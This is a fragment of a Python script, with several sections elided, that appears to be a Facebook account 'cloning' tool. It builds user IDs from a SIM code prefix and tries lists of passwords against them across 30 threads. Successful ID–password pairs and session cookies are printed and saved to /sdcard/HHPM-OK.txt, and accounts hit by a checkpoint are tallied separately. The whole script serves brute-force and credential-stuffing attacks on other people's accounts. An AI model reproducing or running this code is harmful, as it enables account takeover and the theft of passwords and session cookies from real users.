...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code = input('\033[1;33m[❄️\033[1;32m]\033[1;33m YOUR SIM CODE : ')
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('\033[1;33m[❄️\033[1;32m]\033[1;33m YOUR LIMITED : '))
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        tl = str(len(user))
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print('\033[1;33m[💖\033[1;33m] \033[1;36mYOUR TOTAL ID : \033[1;32m'+tl)
        print("\033[1;33m[💖\033[1;33m] \033[1;36mYOUR SIM CODE  :\033[1;32m "+code)
        print('\033[1;33m[💖\033[1;33m]\033[1;36m PLEASE WAIT , CLONING PROCESS IS STARTING')
...
def jubair(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[HHPM]\033[1;36m❄️?[%s/%s]💖\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mHHPM-OK 💖\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[] COOKIE👻 :\033[1;95m {coki}")
                open('/sdcard/HHPM-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               # print(f"#\033[1;33m[\033[1;32mHHPM-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                #open('/sdcard/HHPM-CP.txt',# 'a').write( ui#d+' | '#+ps+' \#n')
                cps.append(uid)
                break
            else:
                continue
